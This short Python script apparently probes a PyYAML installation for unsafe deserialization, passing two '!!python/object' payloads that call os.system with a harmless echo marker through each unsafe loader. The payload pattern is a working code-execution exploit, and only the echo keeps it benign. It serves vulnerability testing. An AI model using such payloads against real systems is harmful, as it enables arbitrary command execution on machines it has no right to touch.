import sys
for p in reversed(("/src/lib3", "/src/lib", "/src/src", "/src")):
    sys.path.insert(0, p)
import yaml
loaders = [getattr(yaml, n) for n in ("UnsafeLoader", "Loader", "FullLoader")
           if getattr(yaml, n, None)]
payloads = [
    "!!python/object/apply:os.system [\"echo VULN_CONFIRMED_BF1670EA\"]",
    "!!python/object/new:os.system [\"echo VULN_CONFIRMED_BF1670EA\"]",
]
for L in loaders:
    for pl in payloads:
        try:
            yaml.load(pl, Loader=L)
        except Exception:
            pass
